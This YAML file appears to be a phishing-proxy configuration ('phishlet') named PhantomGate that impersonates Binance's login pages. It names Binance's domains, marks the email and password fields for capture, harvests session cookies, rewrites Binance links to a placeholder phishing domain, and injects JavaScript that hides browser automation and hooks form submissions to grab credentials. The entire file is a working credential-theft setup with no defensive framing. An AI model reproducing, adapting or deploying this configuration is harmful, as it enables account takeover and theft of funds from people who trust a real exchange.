name: Binance
author: PhantomGate
version: 2.0.0
description: Binance authentication - Pixel-perfect replica

auth:
  domains:
    - binance.com
    - www.binance.com
    - accounts.binance.com
  
  login:
    domain: accounts.binance.com
    path: /login
    username:
      selector: "input#email"
      capture: true
    password:
      selector: "input#password"
      capture: true
  
  tokens:
    cookies:
      - name: bnc-uuid
        regex: ".*"
      - name: _ga
        regex: ".*"
      - name: _gid
        regex: ".*"
      - name: lng
        regex: ".*"
      - name: bnc_location
        regex: ".*"

proxy:
  hosts:
    - domain: binance.com
      inject: true
    - domain: www.binance.com
      inject: true
    - domain: accounts.binance.com
      inject: true
  
  sub_filters:
    - domain: binance.com
      search: "https://www.binance.com"
      replace: "https://{phishing_domain}"

injection:
  js: |
    // PhantomGate Injection - Binance
    (function() {
      'use strict';
      
      // Override navigator properties
      Object.defineProperty(navigator, 'webdriver', {get: () => false});
      
      // Capture form submissions
      document.addEventListener('submit', function(e) {
        var form = e.target;
        var username = form.querySelector('#email');
        var password = form.querySelector('#password');
        if (username && password) {
          console.log('[PhantomGate] Binance credentials captured');
        }
      }, true);
    })();
